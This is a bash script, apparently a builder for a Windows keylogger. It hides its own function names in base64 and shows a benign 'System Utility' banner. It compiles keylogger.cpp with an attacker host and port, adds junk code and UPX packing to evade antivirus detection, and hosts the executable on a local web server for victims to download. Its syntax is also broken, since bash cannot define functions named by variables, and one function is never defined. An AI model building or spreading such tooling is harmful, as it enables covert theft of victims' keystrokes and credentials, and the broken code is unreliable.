#!/bin/bash

# Base64 encoding for better obfuscation
initialize=$(echo -n 'aW5pdGlhbGl6ZQ==' | base64 --decode)
display_banner=$(echo -n 'ZGlzcGxheV9iYW5uZXI=' | base64 --decode)
show_options=$(echo -n 'c2hvd19vcHRpb25z' | base64 --decode)
generate_keylogger=$(echo -n 'Z2VuZXJhdGVfa2V5bG9nZ2Vy' | base64 --decode)
start_server=$(echo -n 'c3RhcnRfc2VydmVy' | base64 --decode)
move_keylogger=$(echo -n 'bW92ZV9rZXlsb2dnZXI=' | base64 --decode)
pack_keylogger=$(echo -n 'cGFja19rZXlsb2dnZXI=' | base64 --decode)
get_filename=$(echo -n 'Z2V0X2ZpbGVuYW1l' | base64 --decode)
add_junk_code=$(echo -n 'YWRkX2p1bmtfY29kZQ==' | base64 --decode)

$initialize() {
  echo -n "Initializing, please wait..."
}

$display_banner() {
  echo -e "\e[92m#################################################\e[0m"
  echo -e "\e[92m#                                               #\e[0m"
  echo -e "\e[92m#               System Utility                  #\e[0m"
  echo -e "\e[92m#                                               #\e[0m"
  echo -e "\e[92m#################################################\e[0m"
}

$update_system() {
  echo "Updating system packages..."
  sudo apt-get update > /dev/null 2>&1
  sudo apt-get install -y mingw-w64 python3 apache2 git upx > /dev/null 2>&1
}

$show_options() {
  echo "Configuration settings:"
}

$get_filename() {
  echo -n "Enter the desired name for the keylogger executable (e.g., mytool.exe): "
  read -r keylogger_name
  if [[ -z "$keylogger_name" ]]; then
    keylogger_name="default_tool.exe"
  fi
  echo "You have set the executable name to $keylogger_name"
}

$add_junk_code() {
  local junk="// Random code: $(date +%N)"
  echo "$junk" >> keylogger.cpp
}

$generate_keylogger() {
  $get_filename
  $add_junk_code
  local host="127.0.0.1"  # This should be dynamically resolved
  local port="9999"       # This should be dynamically resolved
  echo "Configuring environment..."
  sed -i "s/REPLACE_WITH_LHOST/$host/" keylogger.cpp
  sed -i "s/REPLACE_WITH_LPORT/$port/" keylogger.cpp
  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o "$keylogger_name" -lws2_32 -mwindows
  $pack_keylogger
  $move_keylogger
}

$pack_keylogger() {
  upx --best --lzma "$keylogger_name" > /dev/null 2>&1
}

$move_keylogger() {
  sudo mv "$keylogger_name" /var/www/html/
  echo "Setup complete. Access tool via web interface at http://$(hostname -I | awk '{print $1}')/$keylogger_name"
}

$start_server() {
  echo "Starting server on port 8000..."
  python3 /var/www/html/server.py &
  echo "Server started. Access it at http://$(hostname -I | awk '{print $1}'):8000"
}

$initialize
$display_banner

while true; do
  echo "1. Update System"
  echo "2. Deploy Tool"
  echo "3. Exit"
  read -r option

  case $option in
    1)
      $update_system
      ;;
    2)
      $show_options
      $generate_keylogger
      $start_server
      ;;
    3)
      echo "Exiting..."
      exit 0
      ;;
    *)
      echo "Invalid option. Please select 1, 2, or 3."
      ;;
  esac
done
